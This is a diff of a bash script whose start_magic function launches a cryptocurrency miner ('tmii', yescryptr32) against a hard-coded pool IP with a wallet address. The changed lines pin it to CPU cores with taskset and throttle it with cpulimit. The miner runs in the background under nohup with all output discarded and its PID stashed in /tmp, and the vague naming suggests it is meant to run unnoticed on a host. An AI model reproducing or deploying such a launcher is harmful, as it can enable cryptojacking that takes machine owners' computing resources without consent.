@@ -8,14 +8,6 @@ else
   echo "cpulimit is already installed"
 fi
 
-# Check if nice is available
-if ! command -v nice &> /dev/null; then
-  echo "nice command not found. Installing coreutils..."
-  sudo yum install -y coreutils
-else
-  echo "nice command is available"
-fi
-
 # Get the number of CPU cores
 total_cores=$(nproc)
 
@@ -38,13 +30,19 @@ start_magic() {
   local num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
   local worker=$(generate_worker $num_cores)  # Generate worker string including core count
 
-  # Start the mining process with low priority
-  local nice_value=10
-  nohup nice -n $nice_value ./tmii -a yescryptr32 --pool 45.115.225.129:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > /dev/null 2>&1 &
+  # Define the cores to use (for example, using the first 20 cores)
+  local cores_to_use="0-19"  # Modify this range if you want a different set of cores
+
+  # Start the mining process with core affinity
+  taskset -c $cores_to_use nohup ./tmii -a yescryptr32 --pool 45.115.225.129:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > /dev/null 2>&1 &
   local pid=$!
 
   echo "Magic started with PID: $pid using $num_cores cores"
 
+  # Limiting CPU usage to 95% of the allocated cores
+  local cpu_limit=95
+  cpulimit -p $pid -l $cpu_limit &
+  
   # Save PID to a file for later use
   echo $pid > /tmp/magic_pid
 }
